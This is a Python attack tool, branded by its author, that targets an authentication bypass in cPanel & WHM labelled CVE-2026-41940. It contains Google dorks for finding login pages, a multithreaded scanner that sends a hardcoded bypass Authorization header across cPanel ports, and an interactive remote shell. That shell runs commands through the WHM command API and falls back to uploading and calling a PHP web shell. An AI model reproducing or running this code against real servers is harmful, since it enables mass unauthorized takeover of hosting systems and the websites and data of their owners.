#!/usr/bin/env python3
"""
CVE-2026-41940 – cPanel & WHM / WP Squared Auth Bypass Tool
Features: Google dorks | Multi-port smart scanning | Interactive RCE
"""

import requests
import base64
import json
import sys
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

print("""

███╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░░░██████╗░░█████╗░░█████╗░  ░█████╗░██╗░░██╗
████╗░██║██║░░░██║██║░░░░░██║░░░░░╚════██╗██╔══██╗██╔══██╗  ██╔══██╗██║░██╔╝
██╔██╗██║██║░░░██║██║░░░░░██║░░░░░░░███╔═╝██║░░██║██║░░██║  ██║░░██║█████═╝░
██║╚████║██║░░░██║██║░░░░░██║░░░░░██╔══╝░░██║░░██║██║░░██║  ██║░░██║██╔═██╗░
██║░╚███║╚██████╔╝███████╗███████╗███████╗╚█████╔╝╚█████╔╝  ╚█████╔╝██║░╚██╗
╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝╚══════╝░╚════╝░░╚════╝░  ░╚════╝░╚═╝░░╚═╝
              NULL200OK 💀🔥created by NABEEL 🔥💀
CVE-2026-41940 – cPanel & WHM / WP Squared Auth Bypass Tool
Features: Google dorks | Multi-port smart scanning | Interactive RCE

""")

# ========== CONFIGURATION ==========
MAX_THREADS = 10
TIMEOUT = 12
# The magic Authorization bypass
BYPASS_USER = "cpanel"
BYPASS_PASS = "forbidden"
AUTH_HEADER = "Basic " + base64.b64encode(f"{BYPASS_USER}:{BYPASS_PASS}".encode()).decode()

# Common cPanel/WHM/Webmail ports (HTTPS & HTTP)
CPANEL_PORTS = [2087, 2086, 2083, 2082, 2096, 2095]

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
# ===================================

CVE_DESCRIPTION = """
===============================================================================
CVE-2026-41940 – cPanel & WHM / WP Squared Authentication Bypass
===============================================================================
Severity:       CRITICAL (CVSS 9.8)
Published:      2026-04-28
Affected:       cPanel & WHM >= 11.40 through unpatched
                WP Squared
Impact:         Unauthenticated attacker can gain full administrative access
                by sending a crafted Authorization header.
RCE:            Yes, via WHM API (ports 2086/2087) or web shell.
Mitigation:     Update to latest patched version immediately.
Ref:            https://support.cpanel.net/hc/en-us/articles/40073787579671
===============================================================================
"""

DORKS = [
    'intitle:"cPanel - Login"',
    'intitle:"WHM - Login"',
    'inurl:"cpsess"',
    'inurl:"/cpanel"',
    'inurl:"/whm"',
    'inurl:"/login/?goto_uri="',
    'intitle:"WebHost Manager"',
    'intitle:"cPanel, Inc." inurl:2083',
    'intitle:"cPanel - Login" inurl:2083',
    '"This server is powered by cPanel"',
]

def print_dorks():
    print("\n[ Google Dorks for cPanel/WHM ]\n")
    for d in DORKS:
        print(f"  {d}")
    print()

# ---------- Vulnerability detection ----------
def check_vulnerable(target_url):
    """
    target_url must be a full URL with scheme (https://host:port).
    Returns (is_vulnerable, message, optional_data_if_vulnerable)
    """
    # We'll use a WHM API endpoint for detection; this works on WHM ports directly.
    # On cPanel/Webmail ports, the endpoint might redirect or return different.
    # We'll try /json-api/listaccts first, and fallback to /json-api/version.
    endpoints = [
        "/json-api/listaccts?api.version=1",
        "/json-api/version?api.version=1",
    ]

    sess = requests.Session()
    sess.verify = False
    headers = {"Authorization": AUTH_HEADER, "User-Agent": "Mozilla/5.0"}

    for ep in endpoints:
        url = f"{target_url.rstrip('/')}{ep}"
        try:
            resp = sess.get(url, headers=headers, timeout=TIMEOUT, allow_redirects=False)
        except Exception as e:
            continue  # try next endpoint

        if resp.status_code == 200:
            try:
                data = resp.json()
                # listaccts success
                if "acct" in data:
                    return True, "VULNERABLE – account data returned", data
                # version success
                if "version" in data:
                    return True, "VULNERABLE – WHM version info returned", data
            except:
                pass
            # If still 200 and not obviously "login", maybe vulnerable
            if "login" not in resp.text.lower():
                return True, "LIKELY VULNERABLE (non-JSON 200, no login redirect)", None

        # Redirection to login
        if resp.status_code == 302 and "login" in resp.headers.get("Location", "").lower():
            return False, "Not vulnerable (redirects to login)", None
        # Unauthorized
        if resp.status_code in (401, 403):
            return False, f"Not vulnerable (HTTP {resp.status_code})", None

    return False, f"Not vulnerable (no valid endpoint response)", None

# ---------- Port expansion ----------
def expand_target(raw):
    """
    raw is something like:
      '192.168.1.5:2087' – use as is (add https:// if missing)
      'server.com'       – expand to all common cPanel ports
    Returns a list of full URLs (e.g., ['https://192.168.1.5:2087', ...])
    """
    raw = raw.strip()
    if not raw:
        return []

    # If it already has a scheme, we just return it (the scanner will handle single)
    if raw.startswith('http://') or raw.startswith('https://'):
        return [raw]

    # Check if port is present
    if ':' in raw:
        host, port = raw.rsplit(':', 1)
        if port.isdigit():
            # Use HTTPS by default, unless they explicitly say http
            return [f"https://{raw}"]
        else:
            # maybe IPv6? not handling now, just fallback
            return [f"https://{raw}"]

    # No port – expand to all cPanel ports
    host = raw
    targets = []
    for port in CPANEL_PORTS:
        # HTTP for 2086/2082/2095, HTTPS for 2087/2083/2096
        if port in (2086, 2082, 2095):
            targets.append(f"http://{host}:{port}")
        else:
            targets.append(f"https://{host}:{port}")
    return targets

# ---------- Scanner ----------
def scan_single(url):
    vuln, msg, _ = check_vulnerable(url)
    if vuln:
        print(f"[+] {url} : {msg}")
    else:
        print(f"[-] {url} : {msg}")
    return {"target": url, "vulnerable": vuln, "message": msg}

def scan_targets(raw_targets):
    """
    raw_targets: list of strings from user input or file.
    Expands each, then scans all generated URLs concurrently.
    """
    expanded_urls = []
    for t in raw_targets:
        t = t.strip()
        if t:
            expanded_urls.extend(expand_target(t))
    # Remove duplicates while preserving order
    seen = set()
    unique_urls = []
    for u in expanded_urls:
        if u not in seen:
            seen.add(u)
            unique_urls.append(u)

    print(f"\n[ Scanning {len(unique_urls)} targets (ports: {', '.join(map(str, CPANEL_PORTS))}) ]\n")
    results = []
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        future_to_url = {executor.submit(scan_single, url): url for url in unique_urls}
        for future in as_completed(future_to_url):
            results.append(future.result())
    return results

# ---------- RCE ----------
def rce_command(target_url, cmd, fallback_webshell=True):
    """
    Execute a shell command on a WHM port (must be 2086/2087).
    Returns (success, output_or_error).
    """
    # Safety: only allow on WHM ports
    parsed = urlparse(target_url)
    if parsed.port not in (2086, 2087):
        return False, "RCE only works on WHM ports (2086/2087)."

    url = target_url.rstrip('/')
    sess = requests.Session()
    sess.verify = False
    headers = {"Authorization": AUTH_HEADER}

    # Method 1: WHM API command
    try:
        cmd_url = f"{url}/json-api/command?api.version=1&command={requests.utils.quote(cmd)}"
        resp = sess.get(cmd_url, headers=headers, timeout=TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            output = data.get("output", "")
            if output:
                return True, output
    except:
        pass

    # Method 2: Upload PHP web shell
    if fallback_webshell:
        php = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } ?>'
        # Upload to /home (world-writable in many setups)
        upload_url = (f"{url}/json-api/cpanel"
                      "?cpanel_jsonapi_module=Fileman"
                      "&cpanel_jsonapi_func=savefile"
                      "&dir=/home"
                      "&filename=.cve2026.php"
                      f"&content={requests.utils.quote(php)}")
        try:
            resp = sess.get(upload_url, headers=headers, timeout=TIMEOUT)
            if resp.status_code == 200:
                shell_url = f"{url}/.cve2026.php?cmd={requests.utils.quote(cmd)}"
                cmd_resp = sess.get(shell_url, timeout=TIMEOUT)
                # Cleanup immediately
                cleanup_url = (f"{url}/json-api/cpanel"
                               "?cpanel_jsonapi_module=Fileman"
                               "&cpanel_jsonapi_func=unlink"
                               "&path=/home/.cve2026.php")
                sess.get(cleanup_url, headers=headers, timeout=TIMEOUT)
                if cmd_resp.status_code == 200:
                    return True, cmd_resp.text.strip()
        except:
            pass
    return False, "RCE failed."

def exploit_target(target_url):
    print(f"\n[!] Opening interactive shell on {target_url}")
    print("    Type commands; 'exit' to quit.")
    while True:
        cmd = input("shell> ").strip()
        if cmd.lower() == "exit":
            break
        if not cmd:
            continue
        success, output = rce_command(target_url, cmd)
        if success:
            print(output)
        else:
            print(f"[-] {output}")

# ---------- Report saving ----------
def save_results(data, filename=None, fmt='json'):
    if not filename:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"cve2026_41940_results_{ts}.{fmt}"
    if fmt == 'json':
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
    elif fmt == 'html':
        html = f"<html><head><title>CVE-2026-41940 Results</title></head><body>"
        html += f"<h1>Results – {datetime.now()}</h1><table border='1'>"
        html += "<tr><th>Target</th><th>Vulnerable</th><th>Details</th></tr>"
        for row in data:
            status = "YES" if row.get('vulnerable') else "NO"
            msg = row.get('message', '')
            html += f"<tr><td>{row.get('target','')}</td><td>{status}</td><td>{msg}</td></tr>"
        html += "</table></body></html>"
        with open(filename, 'w') as f:
            f.write(html)
    print(f"[✓] Saved to {filename}")

# ---------- Main menu ----------
def main():
    print(CVE_DESCRIPTION)
    print("1. Google dorks")
    print("2. Scan target(s)")
    print("3. Exploit (RCE on WHM port)")
    choice = input("\nChoice: ").strip()

    if choice == '1':
        print_dorks()
        save = input("Save dorks? (json/html/no): ").lower()
        if save in ('json','html'):
            save_results([{"dork": d} for d in DORKS], fmt=save)

    elif choice == '2':
        sub = input("Single target (s) or file (f)? [s/f]: ").lower()
        if sub == 's':
            raw = input("Target (e.g., 192.168.1.1 or host:port): ").strip()
            raw_targets = [raw]
        elif sub == 'f':
            filepath = input("Path to file: ").strip()
            try:
                with open(filepath, 'r') as f:
                    raw_targets = f.readlines()
            except FileNotFoundError:
                print("File not found.")
                return
        else:
            return
        results = scan_targets(raw_targets)
        save = input("Save results? (json/html/no): ").lower()
        if save in ('json','html'):
            save_results(results, fmt=save)

    elif choice == '3':
        target = input("Target (must be WHM port, e.g., 192.168.1.1:2087): ").strip()
        # Expand will return the URL with scheme
        urls = expand_target(target)
        # Filter for WHM ports
        whm_urls = [u for u in urls if urlparse(u).port in (2086, 2087)]
        if not whm_urls:
            print("[-] No WHM port found in target. Use 2086 or 2087.")
            return
        # If multiple, pick first
        target_url = whm_urls[0]
        vuln, msg, _ = check_vulnerable(target_url)
        if not vuln:
            print(f"[-] {target_url} : {msg}")
            return
        print(f"[+] {msg}")
        exploit_target(target_url)
        save = input("Save session summary? (json/html/no): ").lower()
        if save in ('json','html'):
            save_results([{"target": target_url, "vulnerable": True, "message": msg}], fmt=save)

    else:
        print("Invalid option.")

if __name__ == "__main__":
    main()
